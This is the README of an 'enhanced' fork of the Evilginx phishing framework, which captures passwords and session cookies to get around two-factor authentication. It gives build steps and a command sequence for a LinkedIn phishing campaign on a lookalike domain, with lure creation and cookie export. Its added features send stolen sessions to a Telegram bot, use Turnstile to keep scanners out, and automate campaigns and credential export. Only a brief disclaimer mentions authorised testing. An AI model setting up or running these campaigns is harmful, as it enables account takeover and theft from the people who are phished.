<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# Evilginx 3.0 - Enhanced Edition

**Evilginx Enhanced** is a powerful man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection. This enhanced version includes a modern web dashboard, advanced notification system, and comprehensive management tools.

This enhanced edition builds upon the original [Evilginx2](https://github.com/kgretzky/evilginx2) with significant improvements including:

- 🎛️ **Modern Web Dashboard** with authentication system
- 🔐 **Advanced Security Features** with session management
- 📊 **Real-time Monitoring** with WebSocket integration
- 💻 **Terminal Integration** with command filtering
- 📱 **Enhanced Telegram Notifications** with JSON export
- 🛡️ **Turnstile Integration** for advanced bot protection
- ⚡ **Live Session Management** with comprehensive controls

## ✨ New Features

### 🌐 Web Dashboard Authentication
- **Secure Setup Flow**: Initial authentication key generation
- **Session Management**: Token-based authentication with expiration
- **Panel Lock/Unlock**: Emergency lock functionality
- **IP Tracking**: Monitor dashboard access attempts
- **Auto-logout**: Configurable session timeout

### 📊 Enhanced Dashboard Interface
- **Session Management**: Real-time session monitoring with copy-to-clipboard functionality
- **Phishlet Controls**: Enable/disable phishlets with hostname configuration
- **Lure Management**: Complete CRUD operations for lures
- **Credential Export**: One-click credential extraction
- **Live Updates**: Real-time session updates via WebSocket
- **Modern UI**: Glassmorphism design with responsive controls

### 💻 Terminal Integration
- **WebSocket Terminal**: Secure shell access through web interface
- **Command Filtering**: Advanced security filtering for dangerous commands
- **Session Isolation**: Restricted environment for safe operations
- **Real-time I/O**: Full terminal emulation with xterm.js
- **Security Warnings**: Clear indicators for filtered commands

### 📱 Advanced Telegram Integration
- **JSON File Export**: Structured session data export
- **Smart Notifications**: Intelligent detection of valuable sessions
- **File Upload**: Automatic attachment of session data
- **Comprehensive Data**: Full auth token export with metadata
- **Fallback System**: Text messages when file upload fails

### 🛡️ Turnstile Integration
- **Bot Protection**: Cloudflare Turnstile integration
- **Easy Configuration**: Simple terminal commands for setup
- **Dynamic Injection**: Automatic site key replacement
- **Toggle Control**: Enable/disable Turnstile per configuration

## 🚀 Installation

### Prerequisites
- Go 1.19 or higher
- Git
- Linux/macOS/Windows with WSL2

### Quick Setup
```bash
# Clone the repository
git clone https://github.com/olidahallstrom/evilginx-webview.git
cd evilginx-webview/evilginx2

# Build the application
go build -o evilginx2 .

# Run Evilginx2
sudo ./evilginx2
```

### Advanced Installation
```bash
# Install dependencies
go mod download

# Build with specific flags
go build -ldflags="-s -w" -o evilginx2 .

# Create configuration directory
mkdir -p ~/.evilginx

# Set executable permissions
chmod +x evilginx2
```

## ⚙️ Configuration

### Initial Setup
1. **Run Evilginx2**: `sudo ./evilginx2`
2. **Configure Domain**: `config domain your-domain.com`
3. **Set External IP**: `config ipv4 external YOUR_IP`
4. **Configure Ports**: 
   - HTTPS: `config https_port 443`
   - DNS: `config dns_port 53`
   - Web: `config web_port 8080`

### Web Dashboard Setup
1. **Access Dashboard**: Navigate to `http://your-server:8080`
2. **Initial Setup**: Click "Setup Authentication"
3. **Save Auth Key**: Copy and securely store the generated key
4. **Login**: Use the key to access the dashboard

### Turnstile Configuration
```bash
# Set Turnstile site key
config turnstile site_key YOUR_TURNSTILE_SITE_KEY

# Enable Turnstile
config turnstile enabled true
```

### Telegram Integration
```bash
# Set bot token
config telegram bot_token YOUR_BOT_TOKEN

# Set chat ID
config telegram chat_id YOUR_CHAT_ID

# Enable notifications
config telegram enabled true

# Test connection
config telegram test
```

## 🎯 Usage Examples

### Basic Phishing Campaign
```bash
# Load a phishlet
phishlets load linkedin

# Set hostname
phishlets hostname linkedin login.linkedin.evil.com

# Enable phishlet
phishlets enable linkedin

# Create lure
lures create linkedin
lures get-url 0
```

### Advanced Session Management
```bash
# View sessions
sessions

# Export session cookies
sessions 1 export cookies.json

# Delete session
sessions 1 delete
```

### Dashboard Operations
- **Session Monitoring**: View real-time session data
- **Credential Copy**: One-click credential extraction
- **Phishlet Management**: Enable/disable with hostname setting
- **Lure Operations**: Create, edit, and delete lures
- **Terminal Access**: Secure shell through web interface

## 🔧 API Documentation

### Authentication Endpoints
- `POST /api/auth/setup` - Initial authentication setup
- `POST /api/auth/login` - User login
- `POST /api/auth/logout` - User logout
- `GET /api/auth/status` - Authentication status
- `POST /api/auth/lock` - Lock panel
- `POST /api/auth/unlock` - Unlock panel

### Session Management
- `GET /api/sessions` - List all sessions
- `GET /api/sessions/{id}` - Get session details
- `GET /api/stats` - Server statistics

### Phishlet Operations
- `GET /api/phishlets` - List phishlets
- `POST /api/phishlets/{name}/enable` - Enable phishlet
- `POST /api/phishlets/{name}/disable` - Disable phishlet
- `POST /api/phishlets/{name}/hostname` - Set hostname
- `GET /api/phishlets/{name}/credentials` - Export credentials

### Lure Management
- `GET /api/lures` - List lures
- `POST /api/lures` - Create lure
- `PUT /api/lures/{id}` - Update lure
- `DELETE /api/lures/{id}` - Delete lure
- `GET /api/lures/{id}/url` - Get lure URL

### WebSocket Endpoints
- `ws://server:port/ws` - Dashboard updates
- `ws://server:port/ws/terminal` - Terminal access

## 🔒 Security Features

### Authentication Security
- **SHA256 Hashing**: Secure key storage
- **Session Tokens**: Cryptographically secure tokens
- **IP Tracking**: Monitor access attempts
- **Auto-expiration**: Configurable session timeout
- **Panel Lock**: Emergency lock functionality

### Command Security
- **Filtered Commands**: Blocks dangerous operations
- **Path Restrictions**: Prevents access to sensitive files
- **Environment Isolation**: Restricted shell environment
- **Audit Logging**: Comprehensive security logs

### Network Security
- **HTTPS Only**: Secure dashboard communication
- **WebSocket Security**: Authenticated WebSocket connections
- **CSRF Protection**: Request validation
- **Rate Limiting**: Prevents abuse

## 🛠️ Troubleshooting

### Common Issues

**Dashboard Not Accessible**
```bash
# Check web server status
netstat -tlnp | grep :8080

# Verify configuration
config web_port 8080

# Check firewall
sudo ufw allow 8080
```

**Telegram Notifications Not Working**
```bash
# Test connection
config telegram test

# Check logs
tail -f /var/log/evilginx2.log

# Verify configuration
config telegram bot_token
config telegram chat_id
```

**Terminal Not Connecting**
```bash
# Check WebSocket connection
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: test" -H "Sec-WebSocket-Version: 13" http://localhost:8080/ws/terminal
```

### Performance Optimization
- **Database Cleanup**: Regularly clean old sessions
- **Log Rotation**: Configure log rotation
- **Memory Monitoring**: Monitor memory usage
- **Connection Limits**: Set appropriate limits

## 📋 Configuration Files

### Main Configuration
```json
{
  "general": {
    "domain": "your-domain.com",
    "external_ipv4": "YOUR_IP",
    "https_port": 443,
    "dns_port": 53,
    "web_port": 8080
  },
  "telegram": {
    "bot_token": "YOUR_BOT_TOKEN",
    "chat_id": "YOUR_CHAT_ID",
    "enabled": true
  },
  "turnstile": {
    "site_key": "YOUR_SITE_KEY",
    "enabled": true
  },
  "auth": {
    "key_hash": "...",
    "is_setup": true,
    "is_locked": false
  }
}
```

## 🌟 Advanced Features

### Custom Phishlets
- **Dynamic Loading**: Hot-reload phishlets
- **Template System**: Reusable phishlet templates
- **Parameter Injection**: Dynamic parameter replacement
- **Multi-domain Support**: Complex multi-step phishing

### Analytics Dashboard
- **Real-time Metrics**: Live session statistics
- **Success Rates**: Campaign effectiveness tracking
- **Geographic Data**: Visitor location tracking
- **Device Fingerprinting**: Device and browser detection

### Automation Features
- **Scheduled Campaigns**: Automated phishing campaigns
- **Webhook Integration**: External system notifications
- **Batch Operations**: Bulk session management
- **Export Automation**: Automated credential export

## 🤝 Contributing

### Development Setup
```bash
# Clone the repository
git clone https://github.com/olidahallstrom/evilginx-webview.git

# Install dependencies
go mod download

# Run tests
go test ./...

# Build for development
go build -race -o evilginx2-dev .
```

### Code Guidelines
- **Go Standards**: Follow Go best practices
- **Error Handling**: Comprehensive error handling
- **Logging**: Structured logging with levels
- **Testing**: Unit tests for all features
- **Documentation**: Clear code documentation

## 📄 License

**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.

This enhanced version includes modifications by [@olidahallstrom](https://github.com/olidahallstrom) and maintains the same BSD-3 license.

## ⚠️ Disclaimer

This tool is designed for authorized penetration testing and educational purposes only. The authors and contributors are not responsible for any misuse of this tool. Users must ensure they have proper authorization before using this tool against any targets.

**Use responsibly and ethically.**

## 🔗 Links

- **Original Evilginx2**: https://github.com/kgretzky/evilginx2
- **Enhanced Version**: https://github.com/olidahallstrom/evilginx-webview
- **Documentation**: https://help.evilginx.com
- **Training Course**: https://academy.breakdev.org/evilginx-mastery

## 📞 Support

For issues related to the enhanced features:
- **GitHub Issues**: https://github.com/olidahallstrom/evilginx-webview/issues
- **Feature Requests**: Submit via GitHub Issues
- **Security Issues**: Report privately via GitHub Security

For original Evilginx2 support:
- **Official Documentation**: https://help.evilginx.com
- **Original Repository**: https://github.com/kgretzky/evilginx2

---

<p align="center">
  <strong>Enhanced with ❤️ for the cybersecurity community</strong>
</p>
